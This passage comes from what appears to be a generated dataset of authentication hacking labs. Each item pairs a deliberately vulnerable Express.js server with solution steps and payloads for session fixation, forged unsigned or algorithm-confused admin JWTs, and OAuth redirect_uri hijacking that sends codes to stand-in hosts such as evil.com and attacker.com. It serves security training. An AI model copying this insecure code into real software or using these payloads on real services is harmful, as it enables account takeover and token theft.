    "Lab Description": "This application fails to regenerate session identifiers during login. If an attacker can trick a user into logging in with a known session ID, they can later hijack that session. The application allows unauthenticated session identifiers to persist after login. To solve: Hijack Carlos's session by fixing the session ID before login and accessing his My account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a GET /login request and observe the Set-Cookie: session=... header.",
      "2. Note the session value and use Burp Repeater to craft a POST /login request for the victim (Carlos), keeping the same session cookie.",
      "3. Forward the POST request with Carlos's credentials using the fixed session ID.",
      "4. In a separate browser or session, send a GET /my-account request using the same session ID in the cookie.",
      "5. Verify successful hijack by accessing Carlos's My account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'vulnkey', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'abc123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\" type=\"password\"><button type=\"submit\">Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Account of ${req.session.user}`); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Cookie: session=attackerKnownSessionID",
      "POST /login with Cookie: session=attackerKnownSessionID",
      "GET /my-account with Cookie: session=attackerKnownSessionID"
    ]
  },
  {
    "Lab scenario": "JWT tampering via 'alg: none' flaw",
    "Lab Description": "This lab uses JSON Web Tokens to authenticate users but improperly trusts the 'alg' field in the token header. If the server accepts tokens signed with 'alg': 'none', an attacker can forge arbitrary tokens. To solve: Forge a JWT for the admin user and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite or Postman to intercept an authenticated request and extract the JWT.",
      "2. Decode the JWT using jwt.io or jwt_tool to view the header and payload.",
      "3. Create a new JWT with the header: {\"alg\":\"none\"}, and payload: {\"user\":\"admin\"}. Do not sign the token.",
      "4. Replace the original JWT with the forged token in the Authorization header.",
      "5. Send a GET /admin request with the forged token and verify access to the admin interface."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'rootpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ user: username }, 'secretkey'); res.json({ token }); } else { res.status(401).send('Invalid login'); } }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.user === 'admin') res.send('Admin panel accessed'); else res.status(403).send('Access denied'); } catch (e) { res.status(400).send('JWT error'); } }); app.listen(4001, () => console.log('JWT None Exploit Lab running'));",
    "payloads": [
      "{\"alg\":\"none\"}.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Authorization: Bearer <JWT with alg none>",
      "GET /admin with forged JWT"
    ]
  },
  {
    "Lab scenario": "OAuth redirection misuse in authorization flow",
    "Lab Description": "The OAuth integration in this application incorrectly trusts the 'redirect_uri' parameter without proper validation. An attacker can manipulate this to obtain authorization codes meant for other clients. To solve: Capture a valid OAuth code issued to Carlos and use it to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the OAuth authorization request and observe the redirect_uri parameter.",
      "2. Modify the redirect_uri to point to an attacker-controlled domain (http://evil.net/callback).",
      "3. Trick Carlos into clicking the manipulated OAuth URL, capturing the code from your callback server logs.",
      "4. Exchange the intercepted code for an access token via the /token endpoint.",
      "5. Use the token to access /user-info endpoint and retrieve Carlos\u00e2\u20ac\u2122s profile or access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const oauthServer = { client_id: 'client123', redirect_uri: '', users: [{ username: 'carlos' }] }; app.get('/auth', (req, res) => { const { redirect_uri, state } = req.query; oauthServer.redirect_uri = redirect_uri; const code = 'authcode-carlos'; const redirectUrl = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(redirectUrl); }); app.get('/token', (req, res) => { const { code } = req.query; if (code === 'authcode-carlos') res.json({ access_token: 'token-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') res.json({ user: 'carlos', role: 'user' }); else res.status(403).send('Access denied'); }); app.listen(4002, () => console.log('OAuth Redirect Lab running'));",
    "payloads": [
      "GET /auth?redirect_uri=http://evil.net/callback&state=xyz",
      "Captured code: authcode-carlos",
      "GET /token?code=authcode-carlos",
      "Authorization: Bearer token-carlos",
      "GET /user-info with access token"
    ]
  },
  {
    "Lab scenario": "JWT 'none' algorithm bypass in Authorization Header",
    "Lab Description": "This lab uses stateless JWTs to manage user sessions and relies on the `alg` claim for cryptographic validation. The application fails to enforce signature verification when the 'alg' value is set to 'none'. The application trusts the header contents without validating a signature. To solve: Forge a valid admin token and access the /admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid JWT from a normal login session via the Authorization: Bearer header.",
      "Send the token to Burp Decoder and decode its base64 segments to reveal the header and payload.",
      "Modify the header to: {\"alg\":\"none\"}, and the payload to: {\"username\":\"admin\",\"role\":\"admin\"}. Leave the signature empty.",
      "Re-encode the JWT segments without signing and replace the original token in the Authorization header.",
      "Send a GET request to /admin with the forged token. Confirm admin access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username, role: 'admin' }, secret, { algorithm: 'HS256' }); res.json({ token }); } else if (username === 'user' && password === 'userpass') { const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const user = payload.payload; if (user.role === 'admin') return res.send('Welcome admin'); } try { const user = jwt.verify(token, secret); if (user.role === 'admin') return res.send('Welcome admin'); } catch (e) { return res.status(403).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Bypass Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"} . {\"username\":\"admin\",\"role\":\"admin\"} ."
    ]
  },
  {
    "Lab scenario": "Open redirect in OAuth login flow enables account takeover",
    "Lab Description": "The app allows login using an OAuth provider and accepts any `redirect_uri` value passed during the initial auth request. This weak validation allows redirection of access tokens to attacker-controlled domains. To solve: Steal an OAuth token and access the victim's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Open OAuth login flow in browser and observe the redirect_uri parameter.",
      "Use Burp Suite or OWASP ZAP to modify the `redirect_uri` value to point to your server (e.g., https://attacker.com/callback).",
      "Send the manipulated URL to the victim (e.g., through an embedded image or phishing email).",
      "On your server, capture the token via query string (e.g., /callback?token=XYZ).",
      "Use Postman to send a GET /account request with Authorization: Bearer <captured-token> to access the victim's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); app.get('/oauth/start', (req, res) => { const client_id = 'abc123'; const redirect_uri = req.query.redirect_uri; const url = `https://provider.com/auth?response_type=token&client_id=${client_id}&redirect_uri=${redirect_uri}`; res.redirect(url); }); app.get('/oauth/callback', async (req, res) => { const token = req.query.token; try { const userInfo = await axios.get('https://provider.com/userinfo', { headers: { Authorization: `Bearer ${token}` } }); res.send(`Welcome ${userInfo.data.name}`); } catch (e) { res.status(500).send('OAuth error'); } }); const PORT = 3001; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://target.com/oauth/start?redirect_uri=https://attacker.com/callback",
      "GET /account with Authorization: Bearer <captured_token>",
      "https://attacker.com/callback?token=<token>"
    ]
  },
  {
    "Lab scenario": "Session fixation via unrotated session ID after login",
    "Lab Description": "This application assigns a session ID prior to authentication but does not issue a new session ID upon successful login. This allows an attacker to set a session ID for a victim and then log in with it, hijacking the session. To solve: Fixate a session and hijack Carlos's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to initiate a session as a guest and note the Set-Cookie: session=abc123 header.",
      "Send a phishing link with this session ID embedded in a hidden iframe or JS redirect.",
      "Once the victim logs in using this session, their session will remain bound to abc123.",
      "Use Burp Repeater to access /my-account while sending Cookie: session=abc123.",
      "Confirm access to the victim\u00e2\u20ac\u2122s account page without authentication."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'password1', alice: '123456' }; app.get('/', (req, res) => { const sid = req.cookies.session || Math.random().toString(36).substring(2); res.cookie('session', sid); sessions[sid] = sessions[sid] || { loggedIn: false, username: null }; res.send('Welcome, guest'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (users[username] === password) { sessions[sid].loggedIn = true; sessions[sid].username = username; res.send(`Logged in as ${username}`); } else { res.status(403).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; const session = sessions[sid]; if (session && session.loggedIn) { res.send(`Account details for ${session.username}`); } else { res.status(401).send('Not logged in'); } }); const PORT = 3002; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: session=abc123",
      "<iframe src='https://target.com' style='display:none'></iframe>",
      "POST /login with Cookie: session=abc123 and body: username=carlos&password=password1",
      "GET /my-account with Cookie: session=abc123"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Authentication Bypass in Authorization Header",
    "Lab Description": "The application uses JWT tokens for user authentication but fails to validate the token's signing algorithm properly. It trusts tokens where the 'alg' field is set to 'none', allowing attackers to forge tokens without a valid signature. The application grants access to user-specific endpoints solely based on the decoded token. To solve: Forge a valid admin-level token and access the /admin page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a request after logging in as a normal user.",
      "Send the request with the JWT to Burp Decoder and decode its payload and header.",
      "Modify the 'alg' field to 'none' and change the 'username' field in payload to 'admin'.",
      "Remove the signature part from the JWT and re-encode the token.",
      "Send a request to /admin with the forged token in the Authorization header and confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const secret = 'my_secret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'supersecret') { const token = jwt.sign({ username: 'admin' }, secret, { algorithm: 'HS256' }); res.json({ token }); } else if (username === 'user' && password === 'userpass') { const token = jwt.sign({ username: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Unauthorized'); } }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded?.header?.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'admin') { return res.send('Welcome, admin!'); } } else { try { const verified = jwt.verify(token, secret); if (verified.username === 'admin') return res.send('Welcome, admin!'); } catch (e) { return res.status(403).send('Invalid token'); } } res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session Fixation via URL Parameter in Cookie Assignment",
    "Lab Description": "The application improperly assigns session identifiers based on a user-controlled query parameter. When a session ID is passed in the URL, the server uses it without validation, allowing attackers to pre-define the victim's session ID. To solve: Fix a session ID for Carlos before login, then log in with his credentials and hijack the session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using OWASP ZAP, craft a GET request to /login?sessionid=attacker123 and observe the Set-Cookie response.",
      "Copy the fixed session ID into your browser's cookie jar using developer tools or an extension like EditThisCookie.",
      "Provide Carlos's credentials to the login form without changing the session ID.",
      "After Carlos logs in, visit /my-account using the hijacked session.",
      "Verify the session hijack by confirming Carlos\u00e2\u20ac\u2122s account details are visible."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const cookieParser = require('cookie-parser'); app.use(cookieParser()); const users = { 'carlos': 'password1' }; app.get('/login', (req, res) => { const sessionId = req.query.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionId); res.send(`<form method='POST' action='/authenticate?sessionid=${sessionId}'>Username:<input name='username' />Password:<input name='password' /><button>Login</button></form>`); }); const sessions = {}; app.post('/authenticate', express.urlencoded({ extended: true }), (req, res) => { const { username, password } = req.body; const sessionId = req.query.sessionid; if (users[username] === password) { sessions[sessionId] = username; res.send('Login successful'); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user) return res.send(`Welcome to ${user}'s account page.`); res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "/login?sessionid=attacker123",
      "Set-Cookie: sessionid=attacker123",
      "POST /authenticate?sessionid=attacker123"
    ]
  },
  {
    "Lab scenario": "OAuth Authorization Code Interception in OAuth Redirect Endpoint",
    "Lab Description": "The OAuth implementation is vulnerable due to an open redirect flaw in the redirect_uri parameter. Attackers can hijack the authorization code by forcing a victim to authenticate and redirect the code to a malicious domain. To solve: Intercept Carlos\u00e2\u20ac\u2122s OAuth code and exchange it for an access token to access /user-info.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start Burp and intercept the OAuth flow after initiating login with a third-party provider.",
      "Locate the redirect_uri parameter and change it to your attacker-controlled server (e.g., http://evil.com/code-stealer).",
      "Host a listener on evil.com to capture the authorization code from redirected traffic.",
      "Extract the code from the intercepted request and manually send a POST request to the token endpoint using Postman.",
      "Use the obtained access token to access /user-info as Carlos and confirm success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); const users = { 'carlos': 'carlos@email.com' }; app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; const code = 'carlos_auth_code'; res.redirect(`${redirect}?code=${code}`); }); app.post('/token', express.urlencoded({ extended: true }), (req, res) => { const { code } = req.body; if (code === 'carlos_auth_code') { return res.json({ access_token: 'valid_token_for_carlos' }); } res.status(400).send('Invalid code'); }); app.get('/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'valid_token_for_carlos') { return res.send('Welcome, Carlos'); } res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Interception Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "GET /auth?redirect_uri=http://evil.com/code-stealer",
      "POST /token with body code=carlos_auth_code",
      "Authorization: Bearer valid_token_for_carlos"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in authorization middleware",
    "Lab Description": "The application's authorization middleware incorrectly trusts the JWT 'alg' header value, allowing attackers to manipulate the signing algorithm. The application uses asymmetric RSA public key verification by default, but if the JWT's header is altered to use 'HS256', the server uses the public key as the HMAC secret. To solve: Forge a JWT for admin user and access their profile endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a request after logging in as a regular user and extract the JWT from the Authorization header.",
      "2. Decode the JWT using jwt.io or a local script to inspect its header and payload; note the use of RS256 algorithm.",
      "3. Modify the JWT header to replace 'RS256' with 'HS256', and change the payload to { \"user\": \"admin\" }.",
      "4. Sign the token using HMAC-SHA256 with the server's public RSA key as the secret, using a tool like jwt_tool or a Python script.",
      "5. Replace the original token in the Authorization header with the forged one and resend the request to /admin/profile to confirm successful access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.get('/admin/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }); if (decoded.user === 'admin') { res.send('Welcome, admin!'); } else { res.status(403).send('Access denied'); } } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }.{ \"user\": \"admin\" } signed with HMAC using public key as secret",
      "Use jwt_tool.py --exploit alg_none or alg_hs256 with provided public.pem"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration in redirect URI",
    "Lab Description": "The application improperly validates redirect URIs during OAuth implicit flow, allowing an attacker to craft a malicious URL that steals the access token. The application accepts wildcard subdomains without proper origin validation. To solve: Capture a valid token via redirect hijack and access protected user info.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use OWASP ZAP or manual interception to initiate an OAuth login request; observe that the redirect_uri accepts wildcard subdomains of attacker.com.",
      "2. Create a malicious domain like evil.attacker.com and start a listener (e.g., with Python HTTP server) to capture query fragments.",
      "3. Craft an OAuth URL such as: https://auth.app.com/oauth/authorize?response_type=token&client_id=app-client&redirect_uri=https://evil.attacker.com&scope=read_profile",
      "4. Send this URL to the victim and wait for them to authenticate; their access_token will be redirected to your malicious endpoint.",
      "5. Use the stolen token in an Authorization: Bearer header to request /api/user/profile and access the protected resource."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const validRedirects = [/\\.attacker\\.com$/]; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, response_type } = req.query; if (response_type !== 'token') return res.status(400).send('Unsupported flow'); const isValid = validRedirects.some(rx => rx.test(redirect_uri)); if (isValid) { const token = 'eyFakeOAuthToken123'; res.redirect(`${redirect_uri}#access_token=${token}`); } else { res.status(400).send('Invalid redirect URI'); } }); app.listen(4000);",
    "payloads": [
      "https://auth.app.com/oauth/authorize?response_type=token&client_id=app-client&redirect_uri=https://evil.attacker.com&scope=read_profile",
      "Redirect hijack using any *.attacker.com URI"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable token in login endpoint",
    "Lab Description": "This application assigns a session token before authentication and does not regenerate it upon login. The token is predictable and can be reused by an attacker. To solve: Fixate Carlos's session by injecting a known session ID before they log in, then use that session to access their account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman or Burp to initiate a GET /login request and capture the Set-Cookie session ID from the response (e.g., sessionid=12345).",
      "2. Send the login link containing the sessionid to Carlos or simulate their login via CSRF-style form POST using that same session ID.",
      "3. Wait for Carlos to successfully log in, thus associating the known session ID with his account.",
      "4. Reuse the same sessionid=12345 in your browser or tool to access /account and retrieve Carlos\u00e2\u20ac\u2122s information.",
      "5. Confirm access by loading /account and verifying that it returns Carlos\u00e2\u20ac\u2122s personal details."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessions = {}; const users = { carlos: 'hunter2' }; app.get('/login', (req, res) => { const sid = 'sess_' + Math.floor(Math.random() * 100000); sessions[sid] = null; res.cookie('sessionid', sid); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', express.urlencoded({ extended: true }), (req, res) => { const { username, password } = req.body; const sid = req.cookies.sessionid; if (users[username] === password) { sessions[sid] = username; res.redirect('/account'); } else { res.status(401).send('Login failed'); } }); app.get('/account', (req, res) => { const sid = req.cookies.sessionid; const user = sessions[sid]; if (user) { res.send(`Account page for ${user}`); } else { res.status(403).send('Not authenticated'); } }); app.listen(3000);",
    "payloads": [
      "Crafted sessionid sent to target: sess_12345",
      "Fixated cookie: sessionid=sess_12345 used post-login"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in token verification endpoint",
    "Lab Description": "This lab features a JSON Web Token (JWT)-based authentication mechanism where the server incorrectly trusts the 'alg' field in the token. The application verifies tokens using HMAC and exposes a `/jwt-check` API for verification. To solve: forge a valid token to access Carlos's protected account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to send a valid login request and capture the JWT token issued to your account.",
      "2. Decode the token using jwt.io and analyze its header. Observe the algorithm is 'RS256'.",
      "3. Modify the alg field to 'HS256' and use the public key as the HMAC secret to re-sign the token.",
      "4. Change the payload sub field to 'carlos' to impersonate the victim.",
      "5. Use the forged token in the Authorization header to access /my-account and confirm access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const pubKey = fs.readFileSync('./public.pem'); app.get('/jwt-check', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey, { algorithms: ['RS256', 'HS256'] }); if (decoded.sub === 'carlos') return res.send('Welcome Carlos!'); res.send('Access denied'); } catch (err) { res.status(401).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiY2FybG9zIn0.[HMAC-SIGNATURE-WITH-PUBLIC-KEY]",
      "JWT header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }",
      "JWT payload: { \"sub\": \"carlos\" }"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leakage via referer header",
    "Lab Description": "This lab implements OAuth 2.0 with an implicit grant flow. Upon successful login, the access token is included in the URL fragment. A third-party analytics script captures this fragment due to an insecure redirect URI. To solve: extract the access token issued to Carlos by monitoring outbound requests.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Open the browser DevTools and log in as yourself to observe the OAuth flow.",
      "2. Capture the redirect URI in the Location header, and note the access_token in the URL fragment.",
      "3. Observe that a third-party script sends a request to analytics.acme.net with the Referer header containing the token.",
      "4. Intercept the request using OWASP ZAP\u00e2\u20ac\u2122s HTTP proxy to extract Carlos\u00e2\u20ac\u2122s token.",
      "5. Use the stolen token in the Authorization header to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth-callback', (req, res) => { const html = `<!DOCTYPE html><script src='https://analytics.acme.net/script.js'></script><p>OAuth login complete</p>`; res.send(html); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer carlos-oauth-token') return res.send('Carlos account details'); res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Flow Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://example.com/oauth-callback#access_token=carlos-oauth-token&token_type=bearer",
      "Authorization: Bearer carlos-oauth-token"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in login flow",
    "Lab Description": "This lab uses a custom session management system where session IDs are issued before login and stored in cookies. The application does not regenerate the session ID upon authentication. To solve: fix your own session ID, trick Carlos into logging in with it, then reuse the same session to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to visit the site and capture a pre-login session ID from the Set-Cookie header.",
      "2. Craft a phishing link containing the fixed session ID in a cookie header or embed it into an iframe exploit page.",
      "3. Send the crafted link to Carlos and wait for him to authenticate using your session.",
      "4. Once Carlos logs in, reuse the same session ID from your browser to access /my-account.",
      "5. Confirm access to Carlos's account data and verify the session was not regenerated post-auth."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); if (!req.cookies.sid) res.cookie('sid', sid); res.send('Welcome'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sid] = username; res.send('Login successful'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user === 'carlos') res.send('Carlos private data'); else res.status(403).send('Unauthorized'); }); app.listen(5000, () => console.log('Session Fixation Lab running on port 5000'));",
    "payloads": [
      "Cookie: sid=known-session-id",
      "POST /login with sid cookie set before login",
      "Phishing link embedding fixed SID: <iframe src='http://target-site.com?sid=known-session-id'></iframe>"
    ]
  },
  {
    "Lab scenario": "Session Fixation in login flow with static token parameter",
    "Lab Description": "The login mechanism of this web application accepts an optional session token via a query parameter. This token is reused after login without being regenerated. The application stores session tokens in cookies without validating their origin. To solve: Fixate a session token prior to login and hijack the session after authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use OWASP ZAP to spider the application and discover the login endpoint accepting ?token=.",
      "2. Send a GET /login?token=attacker-token request to initialize the fixation token.",
      "3. Share the crafted URL with the victim or simulate a victim login using Burp Suite by modifying the login request to include token=attacker-token.",
      "4. Observe that upon successful login, the same attacker-token is stored in a session cookie without regeneration.",
      "5. Replay the session by sending the attacker-token in the cookie header to access the authenticated user's /dashboard."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; app.get('/login', (req, res) => { const token = req.query.token || Math.random().toString(36).substring(2); res.cookie('session', token); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'secure123') { const token = req.cookies.session; sessions[token] = username; return res.redirect('/dashboard'); } res.send('Invalid login'); }); app.get('/dashboard', (req, res) => { const token = req.cookies.session; const user = sessions[token]; if (user) return res.send(`Welcome ${user}`); res.send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "GET /login?token=attack123",
      "Set-Cookie: session=attack123",
      "POST /login with token set in cookie",
      "GET /dashboard with session=attack123"
    ]
  },
  {
    "Lab scenario": "JWT tampering via alg=none in token verification middleware",
    "Lab Description": "The backend verifies JWTs but does not enforce strict algorithm checks. It accepts tokens signed with 'none', allowing an attacker to forge tokens without a secret key. To solve: Forge a JWT for the admin user using alg=none and gain access to the protected /admin area.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to obtain a legitimate JWT by logging in as a regular user and inspecting the Authorization header.",
      "2. Decode the JWT using jwt.io or a Burp Extension, and note the structure.",
      "3. Create a new token manually where the header includes 'alg':'none' and payload includes 'username':'admin'.",
      "4. Remove the signature section of the JWT and set the forged token in the Authorization: Bearer header.",
      "5. Send a GET /admin request using the crafted JWT and verify access is granted without a valid signature."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'topsecret'; app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'admin') return res.send('Welcome admin'); } else { try { const verified = jwt.verify(token, secret); if (verified.username === 'admin') return res.send('Welcome admin'); } catch (e) { return res.status(403).send('Invalid token'); } } res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"admin\"}",
      "JWT (base64): header.payload.",
      "Authorization: Bearer [forged_token]"
    ]
  },
  {
    "Lab scenario": "OAuth open redirect via manipulated redirect_uri parameter",
    "Lab Description": "The OAuth 2.0 implementation does not validate redirect_uri strictly, allowing an attacker to redirect authorization codes to their own domain. To solve: Manipulate the redirect_uri parameter to intercept an OAuth code and gain access as the victim.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the initial OAuth login flow and identify the redirect_uri parameter.",
      "2. Modify the redirect_uri to an attacker-controlled domain or HTTP server using ngrok or localtunnel.",
      "3. Send the crafted OAuth login URL to the victim, who will authenticate and unknowingly send the code to your server.",
      "4. Extract the authorization code from the request to your server logs or listener.",
      "5. Exchange the stolen code with a POST /token call to get the victim\u00e2\u20ac\u2122s access_token and call /me to confirm user impersonation."
    ],
    "Vulnerability name": "Authentication",
